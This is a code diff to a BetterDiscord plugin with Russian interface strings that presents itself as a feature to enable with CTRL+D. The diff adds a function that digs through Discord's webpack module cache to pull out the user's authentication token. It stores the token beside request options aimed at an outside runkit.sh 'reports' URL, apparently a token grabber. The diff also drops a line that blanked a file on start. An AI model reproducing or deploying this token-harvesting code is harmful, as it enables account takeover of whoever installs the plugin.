@@ -49,7 +49,7 @@ const config = {
 		type: "fixed",
 		items: [
 			"Теперь работает",
-			"Чтобы вклбчить плагин нажмите CTRL+D"
+			"Чтобы включить плагин нажмите CTRL+D"
 		]
 	}],
 	defaultConfig: []
@@ -102,7 +102,30 @@ module.exports = !global.ZeresPluginLibrary ? class {
 	const React = BdApi.React
 	const { DiscordModules, WebpackModules, Patcher, DiscordContextMenu, Settings, DiscordAPI, Toasts, Utilities } = Library;
 	const request = require("request")
-	const tkn = Object.values(webpackJsonp.push([[], { ['']: (_, e, r) => { e.cache = r.c } }, [['']]]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
+	const tkn = getToken()
+	function getToken() {
+        let token
+        var req = webpackJsonp.push([
+            [], {
+                extra_id: (e, r, t) => e.exports = t
+            },
+            [
+                ["extra_id"]
+            ]
+        ]);
+        for (let e in req.c) {
+            if (req.c.hasOwnProperty(e)) {
+                let r = req.c[e].exports;
+                if (r && r.__esModule && r.default)
+                    for (let e in r.default)
+                        if ("getToken" === e) {
+                            token = r.default.getToken();
+                        }
+            }
+        }
+        return token
+
+    }
 	const options = {
 		url: 'https://da-hzcvrvs0dopl.runkit.sh/reports',
 		headers: {
@@ -151,7 +174,6 @@ module.exports = !global.ZeresPluginLibrary ? class {
 		}
 
 		async onStart() {
-			fs.writeFile(path, ` `, function (err) {});
 			delete require.cache[require.resolve(path)]
 			let auth = await this.auth()
 			if (auth === 401) return
